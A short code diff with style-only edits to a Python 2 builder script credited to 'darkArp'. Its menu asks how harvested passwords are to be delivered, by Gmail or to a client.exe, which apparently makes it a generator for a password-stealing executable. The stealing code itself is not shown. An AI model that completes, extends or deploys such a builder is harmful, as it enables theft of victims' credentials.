@@ -1,8 +1,10 @@
 # -*- coding: utf-8 -*-
-# Created by darkArp. For more info check the instructions text file. MarioNascimento@ITCrashSecurity.com
+# Created by darkArp. For more info check the instructions text file. 
+# MarioNascimento@ITCrashSecurity.com
 # Contains test code to be cleaned up
 
-# To include custom icon, place the icon of choice in the same directory as this script and rename it "icon.ico"
+# To include custom icon, place the icon of choice in the same directory as 
+# this script and rename it "icon.ico"
 
 import os
 import sys
@@ -19,14 +21,14 @@ mailto = ""
 serverlineStart = 134
 serverlineStop = 237
 
-while loop == True:
+while loop:
     os.system("cls")
     print "You are using V3.1.2\n\nChoose how you want the passwords delivered\n"
     print "(1) - via email (only Gmail supported, example@gmail.com. Make sure you turn on 'allow less secure apps')\n"
     print "(2) - via the client.exe (to your computer directly)\n"
     option = raw_input('\nChoose a number [1-2]: ')
     if option == "1":
-        appname="server_email"
+        appname = "server_email"
         email = raw_input("Input your Gmail address: ")
         pwd = raw_input("Input your Gmail password: ")
         mailto = raw_input(
